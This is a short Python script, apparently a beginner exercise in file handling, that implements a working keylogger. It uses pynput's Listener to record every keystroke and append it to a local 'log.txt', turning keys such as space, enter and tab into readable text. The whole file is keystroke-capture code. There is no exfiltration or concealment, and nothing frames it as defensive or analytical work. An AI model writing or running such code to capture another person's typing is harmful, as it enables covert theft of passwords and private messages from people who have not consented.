# Importing necessary libraries

from pynput.keyboard import Listener

# Storing keywords into a text file
# File handling - read, write and append text file 

# use of "with" keyword - releases menmory/resources dynamically

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")

    if keydata == "Key.space":
        keydata = " "

    if keydata == "Key.shift":
        keydata = " "

    if keydata == "Key.shift_r":
        keydata = " "
    
    if keydata == "Key.shift_l":
        keydata = " "

    if keydata == "Key.enter":
        keydata = "\n"
    
    if keydata == "Key.tab":
        keydata = " "

    if keydata == "Key.backspace":
        keydata = "Key.backspace "

    with open("log.txt", "a") as f:
        f.write(keydata)
        


with Listener(on_press=writetofile) as l:
    l.join()

